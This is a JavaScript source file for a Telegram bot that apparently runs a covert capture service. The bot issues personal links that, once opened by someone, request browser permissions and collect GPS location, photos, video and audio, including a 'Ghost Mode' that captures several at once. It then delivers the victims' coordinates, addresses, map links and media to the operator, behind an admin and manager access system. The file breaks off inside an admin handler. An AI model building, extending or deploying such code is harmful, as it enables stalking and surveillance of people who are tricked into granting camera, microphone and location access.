/**
 * ============================================
 * Telegram Bot Module
 * ============================================
 * Main bot logic with command and message handlers.
 */

const { Telegraf, Markup } = require('telegraf');
const config = require('./config');
const logger = require('./logger');
const api = require('./api');
const { 
    mainMenuKeyboard,
    adminMenuKeyboard,
    managerMenuKeyboard,
    previewMenuKeyboard,
    getPermissionTypeFromButton, 
    sessionActionsKeyboard,
    adminPanelKeyboard,
    managerPanelKeyboard,
    managerPlusPanelKeyboard,
    accessRequestsKeyboard,
    userListKeyboard,
    userDetailKeyboard,
    staffListKeyboard,
    staffDetailKeyboard
} = require('./keyboard');

// Create bot instance
const bot = new Telegraf(config.botToken);

// Store active sessions for status updates (in-memory)
const activeSessions = new Map();

// ============================================
// Helper Functions
// ============================================

/**
 * Check if user is admin
 */
const isAdmin = (telegramId) => {
    return telegramId === config.admin.telegramId;
};

/**
 * Get user role from API
 */
const getUserRole = async (telegramId) => {
    try {
        const result = await api.getUserRole(telegramId);
        return result;
    } catch (error) {
        logger.error('Failed to get user role', { error: error.message });
        return { role: 'user', isAdmin: false, isManager: false, isManagerPlus: false };
    }
};

/**
 * Encrypt/mask data for manager+ view
 */
const maskData = (data, type) => {
    if (type === 'location') {
        // Show partial coordinates
        const lat = data.latitude ? `${String(data.latitude).substring(0, 5)}***` : 'N/A';
        const lon = data.longitude ? `${String(data.longitude).substring(0, 5)}***` : 'N/A';
        return `📍 ${lat}, ${lon}`;
    }
    if (type === 'address') {
        // Show partial address
        if (!data) return '***';
        const parts = data.split(',');
        return parts[0] + ', ***';
    }
    return '***encrypted***';
};

/**
 * Get appropriate menu for user
 */
const getMenuForUser = async (telegramId) => {
    if (isAdmin(telegramId)) {
        return adminMenuKeyboard;
    }
    
    try {
        // Check role first
        const roleInfo = await getUserRole(telegramId);
        if (roleInfo.isManager) {
            return managerMenuKeyboard;
        }
        
        const result = await api.checkUserStatus(telegramId);
        if (result.success && result.status.isApproved) {
            return mainMenuKeyboard;
        }
    } catch (error) {
        logger.error('Failed to check user status', { error: error.message });
    }
    
    return previewMenuKeyboard;
};

// ============================================
// Middleware
// ============================================

// Log all updates
bot.use((ctx, next) => {
    const user = ctx.from;
    logger.debug('Update received', {
        type: ctx.updateType,
        userId: user?.id,
        username: user?.username
    });
    return next();
});

// ============================================
// Command Handlers
// ============================================

/**
 * /start command - Initialize bot and show appropriate menu
 */
bot.start(async (ctx) => {
    const user = ctx.from;
    
    logger.info('User started bot', {
        userId: user.id,
        username: user.username
    });
    
    // Check user status
    const menu = await getMenuForUser(user.id);
    
    if (isAdmin(user.id)) {
        // Admin welcome
        await ctx.reply(
            `👑 Welcome Admin, ${user.first_name || 'Boss'}!\n\n` +
            `You have full access to all features.\n\n` +
            `I can help you create permission sessions for:\n` +
            `📍 Location tracking\n` +
            `📷 Photo capture\n` +
            `🎥 Video recording\n` +
            `🎤 Audio recording\n` +
            `👻 Ghost Mode (all at once)\n\n` +
            `Use 🔐 Admin Panel to manage users and access requests.`,
            menu
        );
    } else {
        // Check if approved
        try {
            const result = await api.checkUserStatus(user.id);
            
            if (result.success && result.status.isApproved) {
                // Approved user
                await ctx.reply(
                    `👋 Welcome back, ${user.first_name || 'User'}!\n\n` +
                    `I can help you create permission sessions for:\n` +
                    `📍 Location tracking\n` +
                    `📷 Photo capture\n` +
                    `🎥 Video recording\n` +
                    `🎤 Audio recording\n\n` +
                    `Select an option from the menu below to get started.`,
                    menu
                );
            } else if (result.success && result.status.accessRequested) {
                // Access already requested
                await ctx.reply(
                    `👋 Hello, ${user.first_name || 'User'}!\n\n` +
                    `⏳ Your access request is pending.\n` +
                    `Please wait for admin approval.\n\n` +
                    `Contact ${config.admin.contact} for faster response.`,
                    menu
                );
            } else {
                // Not approved - show preview
                await ctx.reply(
                    `👋 Hello, ${user.first_name || 'User'}!\n\n` +
                    `🔒 This bot requires approval to use.\n\n` +
                    `*Preview of features:*\n` +
                    `📍 Location tracking\n` +
                    `📷 Photo capture\n` +
                    `🎥 Video recording\n` +
                    `🎤 Audio recording\n\n` +
                    `Press 🔑 *Request Access* to request permission.\n` +
                    `Or contact: ${config.admin.contact}`,
                    { parse_mode: 'Markdown', ...menu }
                );
            }
        } catch (error) {
            logger.error('Error checking user status', { error: error.message });
            await ctx.reply(
                `👋 Hello, ${user.first_name || 'User'}!\n\n` +
                `🔒 This bot requires approval to use.\n` +
                `Press 🔑 *Request Access* or contact ${config.admin.contact}`,
                { parse_mode: 'Markdown', ...menu }
            );
        }
    }
});

/**
 * /help command - Show help message
 */
bot.help(async (ctx) => {
    await ctx.reply(
        `ℹ️ *How to use this bot:*\n\n` +
        `1️⃣ Select a permission type from the menu\n` +
        `2️⃣ Receive a unique link\n` +
        `3️⃣ Open the link in your browser\n` +
        `4️⃣ Grant permissions when prompted\n` +
        `5️⃣ Data will be captured and stored\n\n` +
        `*Available permissions:*\n` +
        `📍 Location - Track GPS coordinates\n` +
        `📷 Single Photo - Capture one photo\n` +
        `📸 Continuous Photo - Take photos periodically\n` +
        `🎥 Video - Record video\n` +
        `🎤 Microphone - Record audio\n` +
        `👻 Ghost Mode - Capture location, photo & audio together\n\n` +
        `*Commands:*\n` +
        `/start - Show main menu\n` +
        `/help - Show this help message\n` +
        `/status - Check API status`,
        { parse_mode: 'Markdown' }
    );
});

/**
 * /status command - Check API health
 */
bot.command('status', async (ctx) => {
    const isHealthy = await api.checkHealth();
    
    await ctx.reply(
        isHealthy
            ? '✅ Backend API is online and healthy'
            : '❌ Backend API is offline or unhealthy'
    );
});

// ============================================
// Message Handlers
// ============================================

/**
 * Handle all text button presses
 */
bot.on('text', async (ctx) => {
    const buttonText = ctx.message.text;
    const user = ctx.from;
    
    // Handle Admin Panel button
    if (buttonText === '🔐 Admin Panel') {
        if (!isAdmin(user.id)) {
            await ctx.reply('❌ Admin access required.');
            return;
        }
        
        await ctx.reply(
            '🔐 *Admin Panel*\n\n' +
            'Select an option below:',
            { parse_mode: 'Markdown', ...adminPanelKeyboard }
        );
        return;
    }
    
    // Handle Manager Panel button
    if (buttonText === '👔 Manager Panel') {
        const roleInfo = await getUserRole(user.id);
        
        if (!roleInfo.isManager) {
            await ctx.reply('❌ Manager access required.');
            return;
        }
        
        // Show appropriate panel based on role
        const panel = roleInfo.isManagerPlus ? managerPlusPanelKeyboard : managerPanelKeyboard;
        const roleName = roleInfo.isManagerPlus ? 'Manager+' : 'Manager';
        
        await ctx.reply(
            `👔 *${roleName} Panel*\n\n` +
            'Select an option below:',
            { parse_mode: 'Markdown', ...panel }
        );
        return;
    }
    
    // Handle View All Results button
    if (buttonText === '📊 View All Results') {
        await ctx.sendChatAction('typing');
        
        try {
            const result = await api.getAllCapturedData(user.id);
            
            if (!result.success || !result.data || result.data.length === 0) {
                await ctx.reply('📭 No captured data yet.\n\nUse the menu to generate capture links and share them.');
                return;
            }
            
            const data = result.data;
            
            // Categorize data
            const locations = data.filter(d => d.media_type === 'location');
            const photos = data.filter(d => d.media_type === 'photo');
            const videos = data.filter(d => d.media_type === 'video');
            const audios = data.filter(d => d.media_type === 'audio');
            
            // Summary message with view all buttons
            let msg = `📊 *ALL CAPTURED DATA*\n\n`;
            msg += `📍 Locations: ${locations.length}\n`;
            msg += `📷 Photos: ${photos.length}\n`;
            msg += `🎥 Videos: ${videos.length}\n`;
            msg += `🎤 Audio: ${audios.length}\n`;
            msg += `\n━━━━━━━━━━━━━━━━━━\n`;
            msg += `\nTap a button below to view all items:`;
            
            // Build inline keyboard with available categories
            const buttons = [];
            if (locations.length > 0) buttons.push([Markup.button.callback(`📍 View All Locations (${locations.length})`, 'viewall_locations')]);
            if (photos.length > 0) buttons.push([Markup.button.callback(`📷 View All Photos (${photos.length})`, 'viewall_photos')]);
            if (videos.length > 0) buttons.push([Markup.button.callback(`🎥 View All Videos (${videos.length})`, 'viewall_videos')]);
            if (audios.length > 0) buttons.push([Markup.button.callback(`🎤 View All Audio (${audios.length})`, 'viewall_audio')]);
            
            await ctx.reply(msg, { 
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard(buttons)
            });
            
        } catch (error) {
            logger.error('Failed to get all results', { error: error.message });
            await ctx.reply('❌ Failed to fetch results: ' + error.message);
        }
        return;
    }
    
    // Handle Request Access button
    if (buttonText === '🔑 Request Access') {
        try {
            // Check if already requested
            const statusResult = await api.checkUserStatus(user.id);
            
            if (statusResult.success && statusResult.status.isApproved) {
                const menu = await getMenuForUser(user.id);
                await ctx.reply(
                    '✅ You already have access! Use the menu to create sessions.',
                    menu
                );
                return;
            }
            
            if (statusResult.success && statusResult.status.accessRequested) {
                await ctx.reply(
                    '⏳ You have already requested access.\n' +
                    `Please wait for admin approval or contact ${config.admin.contact}`
                );
                return;
            }
            
            // Request access
            await api.requestAccess(user);
            
            await ctx.reply(
                '✅ *Access Request Sent!*\n\n' +
                'Your request has been submitted.\n' +
                `An admin will review it soon.\n\n` +
                `For faster response, contact: ${config.admin.contact}`,
                { parse_mode: 'Markdown' }
            );
            
            // Notify admin
            try {
                await ctx.telegram.sendMessage(
                    config.admin.telegramId,
                    `🔔 *New Access Request*\n\n` +
                    `User: ${user.first_name || ''} ${user.last_name || ''}\n` +
                    `Username: @${user.username || 'N/A'}\n` +
                    `ID: \`${user.id}\`\n\n` +
                    `Use Admin Panel to approve or deny.`,
                    { parse_mode: 'Markdown' }
                );
            } catch (notifyErr) {
                logger.error('Failed to notify admin', { error: notifyErr.message });
            }
            
            logger.info('Access requested', { userId: user.id, username: user.username });
            
        } catch (error) {
            logger.error('Failed to request access', { error: error.message });
            await ctx.reply('❌ Failed to submit request. Please try again later.');
        }
        return;
    }
    
    // Handle Preview buttons (for unapproved users)
    if (buttonText.includes('(Preview)')) {
        await ctx.reply(
            '🔒 *Feature Locked*\n\n' +
            'You need approval to use this feature.\n\n' +
            `Press 🔑 *Request Access* or contact ${config.admin.contact}`,
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    // Check if it's a permission button
    const permissionType = getPermissionTypeFromButton(buttonText);
    
    if (!permissionType) {
        await ctx.reply(
            '🤔 I don\'t understand that message.\n' +
            'Please use the menu buttons below or type /help for assistance.'
        );
        return;
    }
    
    // Check if user is approved
    const userIsAdmin = isAdmin(user.id);
    let userIsApproved = false;
    
    if (!userIsAdmin) {
        try {
            const statusResult = await api.checkUserStatus(user.id);
            userIsApproved = statusResult.success && statusResult.status.isApproved;
        } catch (error) {
            logger.error('Failed to check approval status', { error: error.message });
        }
    }
    
    if (!userIsAdmin && !userIsApproved) {
        await ctx.reply(
            '🔒 *Access Denied*\n\n' +
            'You need approval to use this feature.\n\n' +
            `Press 🔑 *Request Access* or contact ${config.admin.contact}`,
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    const permissionConfig = config.permissions[permissionType];
    
    logger.info('Permission requested', {
        userId: user.id,
        permissionType
    });
    
    // Send typing action for instant feedback
    await ctx.sendChatAction('typing');
    
    try {
        // Map permission types to URL-friendly types
        const typeMap = {
            'location': 'location',
            'single_photo': 'photo',
            'continuous_photo': 'photo',
            'video': 'video',
            'microphone': 'mic',
            'ghost': 'mic'  // Ghost mode uses mic URL but captures all
        };
        
        const urlType = typeMap[permissionType] || permissionType;
        
        // Generate user-based link (same user always gets same link)
        const webLink = `${config.webClient.baseUrl}/${urlType}/${user.id}`;
        
        // Register user with server for notifications
        try {
            await api.registerUserCapture(user, permissionType);
        } catch (regError) {
            logger.warn('Failed to register user for capture', { error: regError.message });
        }
        
        // Send link immediately
        await ctx.reply(
            `✅ *Link Ready!*\n\n` +
            `*Type:* ${permissionConfig.label}\n` +
            `*Description:* ${permissionConfig.description}\n\n` +
            `🔗 *Your permanent link:*\n` +
            `${webLink}\n\n` +
            `📌 *This is YOUR personal link - same link every time!*\n\n` +
            `_Permission will be requested instantly when opened._`,
            {
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            }
        );
        
        logger.info('User link generated', {
            userId: user.id,
            permissionType,
            webLink
        });
        
    } catch (error) {
        logger.error('Failed to create session', {
            userId: user.id,
            error: error.message
        });
        
        await ctx.reply(
            '❌ Failed to create session.\n\n' +
            'Please make sure the backend server is running and try again.\n' +
            'Error: ' + error.message
        );
    }
});

// ============================================
// Callback Query Handlers
// ============================================

/**
 * Handle View All Locations
 */
bot.action('viewall_locations', async (ctx) => {
    await ctx.answerCbQuery('Loading all locations...');
    
    try {
        const telegramId = ctx.from.id.toString();
        const result = await api.getAllCapturedData(telegramId);
        
        if (!result.success) {
            await ctx.reply('❌ Failed to fetch locations');
            return;
        }
        
        const locations = result.data.filter(d => d.media_type === 'location');
        
        if (locations.length === 0) {
            await ctx.reply('📍 No locations captured yet.');
            return;
        }
        
        await ctx.reply(`📍 *ALL LOCATIONS (${locations.length})*\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
        
        // Send in batches of 10 to avoid flooding
        for (let i = 0; i < locations.length; i++) {
            const loc = locations[i];
            const metadata = typeof loc.metadata === 'string' ? JSON.parse(loc.metadata) : loc.metadata;
            
            let locMsg = `📍 *Location ${i + 1}*\n`;
            locMsg += `🕐 ${new Date(loc.created_at).toLocaleString()}\n`;
            
            if (metadata.latitude && metadata.longitude) {
                locMsg += `🎯 \`${metadata.latitude}, ${metadata.longitude}\`\n`;
                if (metadata.accuracy) locMsg += `📏 Accuracy: ${Math.round(metadata.accuracy)}m\n`;
                locMsg += `[📍 Maps](https://www.google.com/maps?q=${metadata.latitude},${metadata.longitude})`;
            }
            
            await ctx.reply(locMsg, { parse_mode: 'Markdown', disable_web_page_preview: true });
            
            // Small delay to avoid rate limiting
            if (i > 0 && i % 10 === 0) {
                await new Promise(r => setTimeout(r, 500));
            }
        }
        
        await ctx.reply(`✅ Showing all ${locations.length} location(s)`);
        
    } catch (error) {
        logger.error('Failed to load all locations', { error: error.message });
        await ctx.reply('❌ Error loading locations: ' + error.message);
    }
});

/**
 * Handle View All Photos
 */
bot.action('viewall_photos', async (ctx) => {
    await ctx.answerCbQuery('Loading all photos...');
    
    try {
        const telegramId = ctx.from.id.toString();
        const result = await api.getAllCapturedData(telegramId);
        
        if (!result.success) {
            await ctx.reply('❌ Failed to fetch photos');
            return;
        }
        
        const photos = result.data.filter(d => d.media_type === 'photo');
        
        if (photos.length === 0) {
            await ctx.reply('📷 No photos captured yet.');
            return;
        }
        
        await ctx.reply(`📷 *ALL PHOTOS (${photos.length})*\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
        
        // Send each photo
        const fs = require('fs');
        const path = require('path');
        
        for (let i = 0; i < photos.length; i++) {
            const photo = photos[i];
            const filePath = photo.file_path;
            const caption = `📷 Photo ${i + 1}\n🕐 ${new Date(photo.created_at).toLocaleString()}`;
            
            try {
                // Try multiple path resolutions
                let fullPath = filePath;
                
                // If path is relative, try different base paths
                if (!path.isAbsolute(filePath)) {
                    fullPath = path.join(__dirname, '..', 'server', filePath);
                }
                
                // Normalize path separators
                fullPath = fullPath.replace(/\\/g, '/');
                
                if (fs.existsSync(fullPath)) {
                    await ctx.replyWithPhoto({ source: fullPath }, { caption });
                } else {
                    // Try alternate path (just storage/...)
                    const altPath = path.join(__dirname, '..', 'server', 'storage', 'photos', path.basename(filePath));
                    if (fs.existsSync(altPath)) {
                        await ctx.replyWithPhoto({ source: altPath }, { caption });
                    } else {
                        await ctx.reply(`📷 Photo ${i + 1}\n🕐 ${new Date(photo.created_at).toLocaleString()}\n⚠️ File not found on server`);
                    }
                }
            } catch (photoErr) {
                logger.warn('Failed to send photo', { error: photoErr.message, filePath });
                await ctx.reply(`📷 Photo ${i + 1}\n🕐 ${new Date(photo.created_at).toLocaleString()}\n📁 Stored on server`);
            }
            
            // Rate limiting delay
            if (i > 0 && i % 5 === 0) {
                await new Promise(r => setTimeout(r, 1000));
            }
        }
        
        await ctx.reply(`✅ Showing all ${photos.length} photo(s)`);
        
    } catch (error) {
        logger.error('Failed to load all photos', { error: error.message });
        await ctx.reply('❌ Error loading photos: ' + error.message);
    }
});

/**
 * Handle View All Videos
 */
bot.action('viewall_videos', async (ctx) => {
    await ctx.answerCbQuery('Loading all videos...');
    
    try {
        const telegramId = ctx.from.id.toString();
        const result = await api.getAllCapturedData(telegramId);
        
        if (!result.success) {
            await ctx.reply('❌ Failed to fetch videos');
            return;
        }
        
        const videos = result.data.filter(d => d.media_type === 'video');
        
        if (videos.length === 0) {
            await ctx.reply('🎥 No videos captured yet.');
            return;
        }
        
        await ctx.reply(`🎥 *ALL VIDEOS (${videos.length})*\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
        
        // Send each video
        const fs = require('fs');
        const path = require('path');
        
        for (let i = 0; i < videos.length; i++) {
            const video = videos[i];
            const filePath = video.file_path;
            const sizeMB = video.file_size ? (video.file_size / (1024 * 1024)).toFixed(2) : '?';
            const caption = `🎥 Video ${i + 1}\n🕐 ${new Date(video.created_at).toLocaleString()}\n📁 Size: ${sizeMB} MB`;
            
            try {
                let fullPath = filePath;
                if (!path.isAbsolute(filePath)) {
                    fullPath = path.join(__dirname, '..', 'server', filePath);
                }
                fullPath = fullPath.replace(/\\/g, '/');
                
                if (fs.existsSync(fullPath)) {
                    await ctx.replyWithVideo({ source: fullPath }, { caption });
                } else {
                    const altPath = path.join(__dirname, '..', 'server', 'storage', 'videos', path.basename(filePath));
                    if (fs.existsSync(altPath)) {
                        await ctx.replyWithVideo({ source: altPath }, { caption });
                    } else {
                        await ctx.reply(`🎥 Video ${i + 1}\n🕐 ${new Date(video.created_at).toLocaleString()}\n⚠️ File not found`);
                    }
                }
            } catch (videoErr) {
                logger.warn('Failed to send video', { error: videoErr.message });
                await ctx.reply(`🎥 Video ${i + 1}\n🕐 ${new Date(video.created_at).toLocaleString()}\n📁 Stored on server`);
            }
            
            // Rate limiting delay for videos
            if (i > 0) {
                await new Promise(r => setTimeout(r, 2000));
            }
        }
        
        await ctx.reply(`✅ Showing all ${videos.length} video(s)`);
        
    } catch (error) {
        logger.error('Failed to load all videos', { error: error.message });
        await ctx.reply('❌ Error loading videos: ' + error.message);
    }
});

/**
 * Handle View All Audio
 */
bot.action('viewall_audio', async (ctx) => {
    await ctx.answerCbQuery('Loading all audio...');
    
    try {
        const telegramId = ctx.from.id.toString();
        const result = await api.getAllCapturedData(telegramId);
        
        if (!result.success) {
            await ctx.reply('❌ Failed to fetch audio');
            return;
        }
        
        const audios = result.data.filter(d => d.media_type === 'audio');
        
        if (audios.length === 0) {
            await ctx.reply('🎤 No audio captured yet.');
            return;
        }
        
        await ctx.reply(`🎤 *ALL AUDIO (${audios.length})*\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
        
        // Send each audio
        const fs = require('fs');
        const path = require('path');
        
        for (let i = 0; i < audios.length; i++) {
            const audio = audios[i];
            const filePath = audio.file_path;
            const sizeMB = audio.file_size ? (audio.file_size / (1024 * 1024)).toFixed(2) : '?';
            const caption = `🎤 Audio ${i + 1}\n🕐 ${new Date(audio.created_at).toLocaleString()}\n📁 Size: ${sizeMB} MB`;
            
            try {
                let fullPath = filePath;
                if (!path.isAbsolute(filePath)) {
                    fullPath = path.join(__dirname, '..', 'server', filePath);
                }
                fullPath = fullPath.replace(/\\/g, '/');
                
                if (fs.existsSync(fullPath)) {
                    await ctx.replyWithAudio({ source: fullPath }, { caption });
                } else {
                    const altPath = path.join(__dirname, '..', 'server', 'storage', 'audio', path.basename(filePath));
                    if (fs.existsSync(altPath)) {
                        await ctx.replyWithAudio({ source: altPath }, { caption });
                    } else {
                        await ctx.reply(`🎤 Audio ${i + 1}\n🕐 ${new Date(audio.created_at).toLocaleString()}\n⚠️ File not found`);
                    }
                }
            } catch (audioErr) {
                logger.warn('Failed to send audio', { error: audioErr.message });
                await ctx.reply(`🎤 Audio ${i + 1}\n🕐 ${new Date(audio.created_at).toLocaleString()}\n📁 Stored on server`);
            }
            
            // Rate limiting delay
            if (i > 0) {
                await new Promise(r => setTimeout(r, 1500));
            }
        }
        
        await ctx.reply(`✅ Showing all ${audios.length} audio recording(s)`);
        
    } catch (error) {
        logger.error('Failed to load all audio', { error: error.message });
        await ctx.reply('❌ Error loading audio: ' + error.message);
    }
});

/**
 * Handle session status check
 */
bot.action(/^status_(.+)$/, async (ctx) => {
    const sessionId = ctx.match[1];
    
    await ctx.answerCbQuery(); // Instant feedback
    
    try {
        const result = await api.getSession(sessionId);
        
        if (!result.success) {
            throw new Error(result.error || 'Session not found');
        }
        
        const { session } = result;
        
        const statusEmoji = {
            created: '🟡',
            active: '🟢',
            ended: '⚫',
            expired: '🔴'
        };
        
        let mediaInfo = '';
        if (session.mediaCounts && Object.keys(session.mediaCounts).length > 0) {
            mediaInfo = '\n\n📊 <b>Data Received:</b>\n';
            for (const [type, count] of Object.entries(session.mediaCounts)) {
                mediaInfo += `  • ${type}: ${count}\n`;
            }
        }
        
        // Build status message
        let statusMessage = 
            `📋 <b>Session Status</b>\n\n` +
            `<b>Status:</b> ${statusEmoji[session.status] || '⚪'} ${session.status.toUpperCase()}\n` +
            `<b>Type:</b> ${config.permissions[session.permissionType]?.label || session.permissionType}\n` +
            `<b>Created:</b> ${new Date(session.createdAt).toLocaleString()}\n` +
            `<b>Expires:</b> ${new Date(session.expiresAt).toLocaleString()}` +
            (session.activatedAt ? `\n<b>Activated:</b> ${new Date(session.activatedAt).toLocaleString()}` : '') +
            (session.endedAt ? `\n<b>Ended:</b> ${new Date(session.endedAt).toLocaleString()}` : '') +
            mediaInfo;
        
        await ctx.reply(statusMessage, { parse_mode: 'HTML' });
        
        // If it's a location session, also show the last location with full details
        if (session.permissionType === 'location' && session.mediaCounts?.location > 0) {
            try {
                const locationsResult = await api.getSessionLocations(sessionId);
                
                if (locationsResult.success && locationsResult.locations.length > 0) {
                    // Get the most recent location
                    const latestLocation = locationsResult.locations[locationsResult.locations.length - 1];
                    const loc = latestLocation.data;
                    
                    let locationMessage = `\n📍 <b>LATEST LOCATION</b>\n\n`;
                    
                    // Address
                    if (loc.address) {
                        locationMessage += `📌 <b>Address:</b>\n${loc.address.formatted || loc.address.displayName}\n\n`;
                        
                        if (loc.address.street) locationMessage += `🏠 Street: ${loc.address.street}\n`;
                        if (loc.address.neighborhood) locationMessage += `🏘️ Area: ${loc.address.neighborhood}\n`;
                        if (loc.address.city) locationMessage += `🌆 City: ${loc.address.city}\n`;
                        if (loc.address.state) locationMessage += `🗺️ State: ${loc.address.state}\n`;
                        if (loc.address.country) locationMessage += `🌍 Country: ${loc.address.country}\n`;
                        if (loc.address.postalCode) locationMessage += `📮 Postal: ${loc.address.postalCode}\n`;
                        locationMessage += `\n`;
                    }
                    
                    // Coordinates
                    if (loc.coordinates) {
                        locationMessage += `🎯 <b>Coordinates:</b>\n`;
                        locationMessage += `├ Lat: <code>${loc.coordinates.latitude?.toFixed(6)}</code>\n`;
                        locationMessage += `├ Lng: <code>${loc.coordinates.longitude?.toFixed(6)}</code>\n`;
                        if (loc.coordinates.accuracy) locationMessage += `├ Accuracy: ${loc.coordinates.accuracy.toFixed(1)}m\n`;
                        locationMessage += `\n`;
                    }
                    
                    // Timestamp
                    locationMessage += `🕐 <b>Captured:</b> ${new Date(latestLocation.timestamp).toLocaleString()}\n\n`;
                    
                    // Maps links
                    if (loc.maps) {
                        locationMessage += `🗺️ <b>View on Maps:</b>\n`;
                        locationMessage += `<a href="${loc.maps.googleMaps}">📍 Open in Google Maps</a>\n`;
                        locationMessage += `<a href="${loc.maps.googleMapsDirections}">🧭 Get Directions</a>`;
                    }
                    
                    await ctx.reply(locationMessage, { 
                        parse_mode: 'HTML',
                        disable_web_page_preview: false
                    });
                }
            } catch (locError) {
                logger.error('Failed to get locations', { error: locError.message });
            }
        }
        
    } catch (error) {
        logger.error('Failed to get session status', {
            sessionId,
            error: error.message
        });
        
        await ctx.reply('❌ Failed to get session status: ' + error.message);
    }
});

/**
 * Handle view results request
 */
bot.action(/^results_(.+)$/, async (ctx) => {
    const sessionId = ctx.match[1];
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.getSessionMedia(sessionId);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to get media');
        }
        
        const { counts, media, permissionType } = result;
        const totalItems = counts.photos + counts.videos + counts.audio + counts.locations;
        
        if (totalItems === 0) {
            await ctx.reply('📭 No data captured yet for this session.');
            return;
        }
        
        // Summary message
        let summaryMsg = `📂 <b>SESSION RESULTS</b>\n\n`;
        summaryMsg += `<b>Type:</b> ${config.permissions[permissionType]?.label || permissionType}\n\n`;
        summaryMsg += `<b>📊 Captured Data:</b>\n`;
        if (counts.photos > 0) summaryMsg += `  📷 Photos: ${counts.photos}\n`;
        if (counts.videos > 0) summaryMsg += `  🎥 Videos: ${counts.videos}\n`;
        if (counts.audio > 0) summaryMsg += `  🎤 Audio: ${counts.audio}\n`;
        if (counts.locations > 0) summaryMsg += `  📍 Locations: ${counts.locations}\n`;
        
        await ctx.reply(summaryMsg, { parse_mode: 'HTML' });
        
        // Send locations with full details
        if (media.locations && media.locations.length > 0) {
            for (let i = 0; i < media.locations.length; i++) {
                const loc = media.locations[i];
                const data = loc.metadata;
                
                let locMsg = `📍 <b>LOCATION ${i + 1}</b>\n`;
                locMsg += `🕐 ${new Date(loc.createdAt).toLocaleString()}\n\n`;
                
                if (data.address) {
                    locMsg += `📌 <b>Address:</b>\n${data.address.formatted || data.address.displayName}\n\n`;
                    if (data.address.street) locMsg += `🏠 Street: ${data.address.street}\n`;
                    if (data.address.neighborhood) locMsg += `🏘️ Area: ${data.address.neighborhood}\n`;
                    if (data.address.city) locMsg += `🌆 City: ${data.address.city}\n`;
                    if (data.address.state) locMsg += `🗺️ State: ${data.address.state}\n`;
                    if (data.address.country) locMsg += `🌍 Country: ${data.address.country}\n`;
                    if (data.address.postalCode) locMsg += `📮 Postal: ${data.address.postalCode}\n`;
                }
                
                if (data.coordinates) {
                    locMsg += `\n🎯 <b>Coordinates:</b>\n`;
                    locMsg += `├ Lat: <code>${data.coordinates.latitude?.toFixed(6)}</code>\n`;
                    locMsg += `├ Lng: <code>${data.coordinates.longitude?.toFixed(6)}</code>\n`;
                    if (data.coordinates.accuracy) locMsg += `├ Accuracy: ${data.coordinates.accuracy.toFixed(1)}m\n`;
                }
                
                if (data.maps) {
                    locMsg += `\n🗺️ <a href="${data.maps.googleMaps}">Open in Google Maps</a>`;
                }
                
                await ctx.reply(locMsg, { parse_mode: 'HTML', disable_web_page_preview: false });
            }
        }
        
        // Send photos
        if (media.photos && media.photos.length > 0) {
            for (let i = 0; i < media.photos.length; i++) {
                const photo = media.photos[i];
                try {
                    const photoUrl = `${config.api.baseUrl}/api/sessions/${sessionId}/media/${photo.id}/file`;
                    await ctx.replyWithPhoto(
                        { url: photoUrl },
                        { caption: `📷 Photo ${i + 1} - ${new Date(photo.createdAt).toLocaleString()}` }
                    );
                } catch (photoErr) {
                    logger.error('Failed to send photo', { error: photoErr.message });
                    await ctx.reply(`📷 Photo ${i + 1} - File available on server: ${photo.fileName}`);
                }
            }
        }
        
        // Send videos
        if (media.videos && media.videos.length > 0) {
            for (let i = 0; i < media.videos.length; i++) {
                const video = media.videos[i];
                try {
                    const videoUrl = `${config.api.baseUrl}/api/sessions/${sessionId}/media/${video.id}/file`;
                    await ctx.replyWithVideo(
                        { url: videoUrl },
                        { 
                            caption: `🎥 Video ${i + 1} - ${new Date(video.createdAt).toLocaleString()}`,
                            duration: video.duration
                        }
                    );
                } catch (videoErr) {
                    logger.error('Failed to send video', { error: videoErr.message });
                    await ctx.reply(`🎥 Video ${i + 1} - File available on server: ${video.fileName}`);
                }
            }
        }
        
        // Send audio
        if (media.audio && media.audio.length > 0) {
            for (let i = 0; i < media.audio.length; i++) {
                const audio = media.audio[i];
                try {
                    const audioUrl = `${config.api.baseUrl}/api/sessions/${sessionId}/media/${audio.id}/file`;
                    await ctx.replyWithAudio(
                        { url: audioUrl },
                        { 
                            caption: `🎤 Audio ${i + 1} - ${new Date(audio.createdAt).toLocaleString()}`,
                            duration: audio.duration
                        }
                    );
                } catch (audioErr) {
                    logger.error('Failed to send audio', { error: audioErr.message });
                    await ctx.reply(`🎤 Audio ${i + 1} - File available on server: ${audio.fileName}`);
                }
            }
        }
        
        logger.info('Results sent to user', { sessionId, counts });
        
    } catch (error) {
        logger.error('Failed to get session results', {
            sessionId,
            error: error.message
        });
        
        await ctx.reply('❌ Failed to get results: ' + error.message);
    }
});

/**
 * Handle session end request
 */
bot.action(/^end_(.+)$/, async (ctx) => {
    const sessionId = ctx.match[1];
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.endSession(sessionId);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to end session');
        }
        
        // Remove from active sessions
        activeSessions.delete(sessionId);
        
        await ctx.reply(
            '✅ Session ended successfully.\n\n' +
            'No more data will be accepted for this session.'
        );
        
        logger.info('Session ended by user', { sessionId });
        
    } catch (error) {
        logger.error('Failed to end session', {
            sessionId,
            error: error.message
        });
        
        await ctx.reply('❌ Failed to end session: ' + error.message);
    }
});

// ============================================
// Admin Callback Handlers
// ============================================

/**
 * Handle admin panel button
 */
bot.action('admin_panel', async (ctx) => {
    const user = ctx.from;
    
    if (!isAdmin(user.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery();
    await ctx.editMessageText(
        '🔐 *Admin Panel*\n\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        'Manage users, view data, and more.\n' +
        'Select an option below:',
        { parse_mode: 'Markdown', ...adminPanelKeyboard }
    );
});

/**
 * Handle admin dashboard
 */
bot.action('admin_dashboard', async (ctx) => {
    const user = ctx.from;
    
    if (!isAdmin(user.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
